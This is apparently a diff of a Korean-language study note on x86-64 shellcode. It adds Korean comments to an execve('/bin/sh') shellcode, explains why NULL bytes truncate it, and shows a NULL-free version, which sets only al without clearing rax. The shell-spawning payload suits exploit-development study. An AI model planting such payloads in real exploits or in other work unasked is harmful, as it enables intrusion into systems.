@@ -28,31 +28,34 @@ global _start
 
 section .text
 _start:
-    mov rax, 59         ; execve syscall number
-    push 0              ; push NULL string terminator
-    mov rdi, '/bin//sh' ; first arg to /bin/sh
-    push rdi            ; push to stack 
-    mov rdi, rsp        ; move pointer to ['/bin//sh']
-    push 0              ; push NULL string terminator
-    push rdi            ; push second arg to ['/bin//sh']
-    mov rsi, rsp        ; pointer to args
-    mov rdx, 0          ; set env to NULL
-    syscall
+    mov rax, 59         ; execve 시스템 호출 번호 설정 (execve = 59)
+    push 0              ; 문자열 끝을 나타내기 위해 NULL(0) 푸시
+    mov rdi, '/bin//sh' ; 첫 번째 인자: 실행할 프로그램 경로 (/bin/sh)
+    push rdi            ; 문자열을 스택에 푸시
+    mov rdi, rsp        ; rdi에 프로그램 경로의 주소 설정
+    push 0              ; 두 번째 인자 배열의 끝을 나타내기 위해 NULL 푸시
+    push rdi            ; 두 번째 인자: 인자 배열에 프로그램 경로 주소 푸시
+    mov rsi, rsp        ; rsi에 인자 배열의 주소 설정
+    mov rdx, 0          ; 환경 변수는 사용하지 않으므로 NULL로 설정
+    syscall             ; 시스템 호출 실행 (execve("/bin/sh", ["/bin/sh"], NULL))
 ```
+> 해석하면 맨 앞바이트가 NULL (0x00) 이 들어가게 됨.
+이 NULL 바이트가 쉘코드 전체를 문자열로 해석하는 도중 조기 종료를 유발해서,
+쉘코드가 중간에 짤려버리는 위험이 있다.
 
 ### ✅ 수정된 어셈블리 코드 예시 (NULL 제거 버전)
 ```nasm
 _start:
-    mov al, 59          ; execve syscall number
-    xor rdx, rdx        ; set env to NULL
-    push rdx            ; push NULL string terminator
-    mov rdi, '/bin//sh' ; first arg to /bin/sh
-    push rdi            ; push to stack 
-    mov rdi, rsp        ; move pointer to ['/bin//sh']
-    push rdx            ; push NULL string terminator
-    push rdi            ; push second arg to ['/bin//sh']
-    mov rsi, rsp        ; pointer to args
-    syscall
+    mov al, 59          ; execve 시스템 콜 번호 설정 (al = 59)
+    xor rdx, rdx        ; rdx를 0으로 초기화 (환경 변수는 NULL로 설정)
+    push rdx            ; NULL 문자열 종료자 푸시
+    mov rdi, '/bin//sh' ; 실행할 프로그램 경로 '/bin//sh'를 rdi에 저장
+    push rdi            ; 스택에 '/bin//sh' 푸시
+    mov rdi, rsp        ; rdi를 스택의 현재 위치(= 문자열 시작 주소)로 설정
+    push rdx            ; NULL 포인터 푸시 (인자 배열의 끝 표시)
+    push rdi            ; '/bin//sh' 문자열 주소 푸시 (인자 배열 시작)
+    mov rsi, rsp        ; rsi를 인자 배열의 시작 주소로 설정
+    syscall             ; execve("/bin/sh", ["/bin/sh"], NULL) 실행
 ```
 
 ### ✅ NULL 제거 버전으로 수정 후 결과:
